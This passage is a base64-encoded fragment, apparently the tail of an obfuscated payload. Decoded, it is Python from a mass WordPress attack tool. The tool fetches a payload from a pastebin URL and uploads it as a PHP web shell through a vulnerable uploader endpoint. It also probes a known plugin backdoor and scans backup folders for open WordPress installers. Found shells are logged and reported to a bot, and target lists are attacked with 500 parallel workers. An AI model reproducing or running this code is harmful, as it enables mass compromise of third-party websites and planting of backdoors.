PT09PT09PT0+Pj4+ICAnK2kpCiAgICBleGNlcHQgOgogICAgICAgIHBhc3MKZGVmIHVwbG9hZGVyX2V4cGxvaXRfdXRjaGloYSh2dWxucykgOgogICAgX19faGZneXNhemVyX19fbmJ2eHdfX2tobGptID0gc3RyaW5nLmFzY2lpX3VwcGVyY2FzZQogICAgX19fX19fdXl0Y2hkaGpzcW1kID0gcmFuZGludCgzLDUpCiAgICByYW5kb21pbmcgPSAnJy5qb2luKGNob2ljZShfX19oZmd5c2F6ZXJfX19uYnZ4d19fa2hsam0pIGZvciBpIGluIHJhbmdlKF9fX19fX3V5dGNoZGhqc3FtZCkpCiAgICBsaW5rX3VwbG9hZF9pc19oZXJlID0gJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9mZWhuaU1KWCcKICAgIGNvZGVfc291cmNlID0gcmVxdWVzdHMuZ2V0KGxpbmtfdXBsb2FkX2lzX2hlcmUsIHRpbWVvdXQ9MTApLnRleHQKICAgIGZpbGV6bmFtZSA9ICd1dGNoaWhhLScrcmFuZG9taW5nKycucGhwJwogICAgZmlsZWRhdGEgPSB7J2wnOiAnLi8nfQogICAgZmlsZXVwID0geyd1c2VyZmlsZSc6IChmaWxlem5hbWUsIGNvZGVfc291cmNlKX0KICAgIHVwID0gcmVxdWVzdHMucG9zdCh2dWxucyAsIGRhdGE9ZmlsZWRhdGEsIGZpbGVzPWZpbGV1cCwgaGVhZGVycz1oZWFkZXJzICwgdmVyaWZ5PUZhbHNlLCB0aW1lb3V0PTMwKQogICAgbmV3U2hlbGwgPSB2dWxucy5yZXBsYWNlKCdJT3B0aW1pemUucGhwP3JjaGsnLCBmaWxlem5hbWUpCiAgICBjaGVja19zaGVsbCA9IHJlcXVlc3RzLmdldChuZXdTaGVsbCwgaGVhZGVycz1oZWFkZXJzLCB2ZXJpZnk9RmFsc2UsIHRpbWVvdXQ9MTUpLmNvbnRlbnQKICAgIGlmICdtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG5hbWU9InVwbG9hZGVyIicgaW4gIGNoZWNrX3NoZWxsOgogICAgICAgIHByaW50KCd1cGxvYWRlZCA9PT09PT4+PiAnK25ld1NoZWxsKQogICAgICAgIG9wZW4oJ3NoZWxscy50eHQnLCdhJykud3JpdGUobmV3U2hlbGwrJ1xuJykKICAgICAgICBTZW5kTXNnKG5ld1NoZWxsKQogICAgZWxzZSA6CiAgICAgICAgcHJpbnQoZnIrJ2ZhaWwgdXBsYW9kID09PT09Pj4+JyArIHZ1bG5zKQoKZGVmIGV4cGxvaXRfdHdvKGkpIDoKICAgIHRyeSA6CiAgICAgICAgc2hlbGwgPSAnaHR0cDovLycraSsnL3dwLWNvbnRlbnQvcGx1Z2lucy9zZW9wbHVnaW5zL2RiLnBocD91JwogICAgICAgIHB5X2NoZWNrID0gcmVxdWVzdHMuZ2V0KHNoZWxsLCB2ZXJpZnk9RmFsc2UsIHRpbWVvdXQ9MTApCiAgICAgICAgaWYgJyMweDI1MjU8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IicgaW4gcHlfY2hlY2sudGV4dCA6CiAgICAgICAgICAgIHByaW50KCdbVnVsbiBjaGVja10gPT09PT09Pj4+ICcraSkKICAgICAgICAgICAgb3BlbigndnVsbi50eHQnLCdhJykud3JpdGUoc2hlbGwrJ1xuJykKICAgICAgICAgICAgU2VuZE1zZyhzaGVsbCkKICAgICAgICAgICAgZXhwcChzaGVsbCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludChmcisnRmFpbGwgPSA9PT09Pj4+ICAnK2kpCiAgICBleGNlcHQgOgogICAgICAgIHBhc3MKCiNuZXcKCmRlZiByYW4obGVuZ3RoKToKICAgIGxldHRlcnMgPSBzdHJpbmcuYXNjaWlfbG93ZXJjYXNlCiAgICByZXR1cm4gJycuam9pbihyYW5kb20uY2hvaWNlKGxldHRlcnMpIGZvciBpIGluIHJhbmdlKGxlbmd0aCkpCgpkZWYgVVJMZG9tYWluKHNpdGUpOgogICAgaWYgJ2h0dHA6Ly8nIG5vdCBpbiBzaXRlIGFuZCAnaHR0cHM6Ly8nIG5vdCBpbiBzaXRlIDoKICAgICAgICBzaXRlID0gJ2h0dHA6Ly8nK3NpdGUKICAgIGlmIHNpdGVbLTFdICAhPSAnLycgOgogICAgICAgIHNpdGUgPSBzaXRlKycvJwogICAgcmV0dXJuIHNpdGUKCmRlZiBkb21haW4oc2l0ZSk6CiAgICBpZiBzaXRlLnN0YXJ0c3dpdGgoImh0dHA6Ly8iKSA6CiAgICAgICAgc2l0ZSA9IHNpdGUucmVwbGFjZSgiaHR0cDovLyIsIiIpCiAgICBlbGlmIHNpdGUuc3RhcnRzd2l0aCgiaHR0cHM6Ly8iKSA6CiAgICAgICAgc2l0ZSA9IHNpdGUucmVwbGFjZSgiaHR0cHM6Ly8iLCIiKQogICAgaWYgJ3d3dy4nIGluIHNpdGUgOgogICAgICAgIHNpdGUgPSBzaXRlLnJlcGxhY2UoInd3dy4iLCAiIikKICAgIHNpdGUgPSBzaXRlLnJzdHJpcCgpCiAgICBpZiBzaXRlLnNwbGl0KCcvJykgOgogICAgICAgIHNpdGUgPSBzaXRlLnNwbGl0KCcvJylbMF0KICAgIHdoaWxlIHNpdGVbLTFdID09ICIvIjoKICAgICAgICBwYXR0ZXJuID0gcmUuY29tcGlsZSgnKC4qKS8nKQogICAgICAgIHNpdGV6ID0gcmUuZmluZGFsbChwYXR0ZXJuLHNpdGUpCiAgICAgICAgc2l0ZSA9IHNpdGV6WzBdCiAgICByZXR1cm4gc2l0ZQoKZGVmIGFkZFdXVyhzaXRlKToKICAgIGlmIHNpdGUuc3RhcnRzd2l0aCgiaHR0cDovLyIpOgogICAgICAgIHNpdGUgPSBzaXRlLnJlcGxhY2UoImh0dHA6Ly8iLCAiaHR0cDovL3d3dy4iKQogICAgZWxpZiBzaXRlLnN0YXJ0c3dpdGgoImh0dHBzOi8vIik6CiAgICAgICAgc2l0ZSA9IHNpdGUucmVwbGFjZSgiaHR0cHM6Ly8iLCAiaHR0cHM6Ly93d3cuIikKICAgIGVsc2UgOgogICAgICAgIHNpdGUgPSAnaHR0cDovL3d3dy4nK3NpdGUKICAgIHJldHVybiBzaXRlCgpkZWYgZXhwbG9pdCh1cmwpIDoKIyAgICBwcmludCgicnVubmluZyBuZXcgZXhwbG9pdCIpCiAgICB0cnkgOgogICAgIyAgICBkb20gPSBkb21haW4odXJsKQogICAjICAgICB1cmwgPSBVUkxkb21haW4odXJsKQogICAgICAgIGlmICd3d3cuJyBpbiB1cmw6CiAgICAgICAgICAgIHVzZXJuYW1lID0gdXJsLnJlcGxhY2UoJ3d3dy4nLCAnJykKICAgICAgICBlbHNlOgogICAgICAgICAgICB1c2VybmFtZSA9IHVybAogICAgICAgIGlmICcuJyBpbiB1c2VybmFtZToKICAgICAgICAgICAgdXNlcm5hbWUgPSB1c2VybmFtZS5zcGxpdCgnLicpWzBdCiAgICAgICAgaWYgJ2h0dHA6Ly8nIGluIHVzZXJuYW1lOgogICAgICAgICAgICB1c2VybmFtZSA9IHVzZXJuYW1lLnJlcGxhY2UoJ2h0dHA6Ly8nLCAnJykKICAgICAgICBlbHNlOgogICAgICAgICAgICB1c2VybmFtZSA9IHVzZXJuYW1lLnJlcGxhY2UoJ2h0dHBzOi8vJywgJycpCiAgICAgICAgdXA9dXNlcm5hbWUudGl0bGUoKQogICAgICAgIGxpc3RkaXIgPSBbImJrIiwgImhvbWUiLCAid3AiLCAiY21zIiwgIndvcmRwcmVzcyIsICJiYWNrdXAtY29yZSIsInVzZXJuYW1lIiwgIndwMSIsICJvbGQxIiwgIm9sZF9maWxlcyIsICIxMjMiLCAib2xkd2Vic2l0ZSIsICJXUCIsICJXb3JkUHJlc3MiLCAiV09SRFBSRVNTIiwidXAiLCAiYmxvZyIsICJuZXciLCAib2xkIiwgIk9sZCIsICJkZW1vIiwgInNhbmRib3giLCAiYmFja3VwIiwgIkJhY2t1cCIsICJCQUNLVVAiLCAidGVzdCIsICIyMDIwIiwgIjIwMTkiLCAic2l0ZSIsIm5ld3NpdGUiLCAiT2xkIiwiZGV2IiwiY29weSIsImJrcCIsImJsb2dzIiwiYmtwMiIsIm9sZC1zaXRlIiwib2xkX2NvcmUiXQogICAgICAgIGZvciBkaXJlY3RvcnkgaW4gbGlzdGRpcjoKICAgICAgICAgICAgaW5qID0gdXJsK2RpcmVjdG9yeQogICAgICAgICAgICBjaGVjayA9IHJlcXVlc3RzLmdldChpbmosIGhlYWRlcnM9aGVhZGVycywgdmVyaWZ5PUZhbHNlLCB0aW1lb3V0PTE1KS5jb250ZW50CiAgICAgICAgICAgIGlmICdXb3JkUHJlc3MgJnJzYXF1bzsgSW5zdGFsbGF0aW9uJyBpbiBjaGVjayA6CiAgICAgICAgICAgICAgICBvcGVuKCd2dWxuLnR4dCcsICdhJykud3JpdGUodXJsK2RpcmVjdG9yeSArJyBcbicpCiAgICAgICAgICAgICAgICBwcmludCAoJyAtfCAnICsgdXJsICsgZGlyZWN0b3J5ICsgJy0tPicrZmcrJ1tTdWNjZWZ1bGx5XScpCiAgICAgICAgICAgICAgICBTZW5kTXNnKHVybCArIGRpcmVjdG9yeSkKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGVsaWYgJ1dvcmRQcmVzcyAmcnNhcXVvOyBTZXR1cCBDb25maWd1cmF0aW9uIEZpbGUnIGluIGNoZWNrIDoKICAgICAgICAgICAgICAgIG9wZW4oJ3Z1bG4udHh0JywgJ2EnKS53cml0ZSh1cmwrZGlyZWN0b3J5ICArICdcbicpCiAgICAgICAgICAgICAgICBTZW5kTXNnKHVybCArIGRpcmVjdG9yeSkKICAgICAgICAgICAgICAgIHByaW50ICgnIC18ICcgKyB1cmwgKyBkaXJlY3RvcnkgKyAnLS0+JytmZysnW1N1Y2NlZnVsbHldJykKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGVsc2UgOgogICAgICAgICAgICAgICAgcHJpbnQgKCcgLXwgJyArIHVybCArIGRpcmVjdG9yeSArICctLT4gJytmcisnW0ZhaWxlZF0nKQogICAgZXhjZXB0IDoKICAgICAgICBwcmludCAoJyAtfCAnICsgdXJsICsgZGlyZWN0b3J5ICsgJy0tPiAnK2ZyKydbRmFpbGVkXScpCiAgICAgICAgCiNuZXcgZW5kCgoKZGVmIGFsbChpKSA6CiAgICBmaXJzdChpKQogICAgY2hlY2tpbmcoaSkKICAgIG1hcihpKQogICAgY2hlY2tlKGkpCiAgICBleHBsb2l0X3R3byhpKQogICAgZXhwbG9pdChpKQoKdHJ5OgogICAgdGFyZ2V0ID0gW2kuc3RyaXAoKSBmb3IgaSBpbiBvcGVuKHN5cy5hcmd2WzFdLCBtb2RlPSdyJykucmVhZGxpbmVzKCldCmV4Y2VwdCBJbmRleEVycm9yOgogICAgcGF0aCA9IHN0cihzeXMuYXJndlswXSkuc3BsaXQoJ1xcJykKICAgIGV4aXQoJ1xuICBbIV0gRW50ZXIgPCcgKyBwYXRoW2xlbihwYXRoKSAtIDFdICsgJz4gPHNpdGVzLnR4dD4nKQogICAgCiAgICAKCnV0Y2hpaGEgPSBQb29sKGludCg1MDApKQp1dGNoaWhhLm1hcChhbGwsIHRhcmdldCkKCgoKJycnZGVmIG1haW4oKSA6CgkgICAgZ2xvYmFsIHRva2VuICwgY2hhdGlkCgkgICAgaWYgb3MucGF0aC5pc2ZpbGUoJ2NvbmZpZy5pbmknKToKCSAgICAgICAgY29uZmlncyA9IG9wZW4oJ2NvbmZpZy5pbmknLCdyJyxlcnJvcnM9J2lnbm9yZScpLnJlYWQoKQoJICAgICAgICB0b2tlbiA9IHJlZygndG9rZW4gPSAiKC4qPykiJyxjb25maWdzKVswXQoJICAgICAgICBjaGF0aWQgPSByZWcoJ2NoYXRpZCA9ICIoLio/KSInLGNvbmZpZ3MpWzBdCgkgICAgZWxzZToKCSAgICAgICAgb3BlbignY29uZmlnLmluaScsJ2EnKS53cml0ZSgndG9rZW4gPSAiIlxuY2hhdGlkID0gIiInKQogICAgICAgIGlucHV0KCdbIV0gUHJlc3MgRW50ZXIgdG8gZXhpdCEnKQogICAgICAgIGV4aXQoKQogICAgICAgICcnJw=='))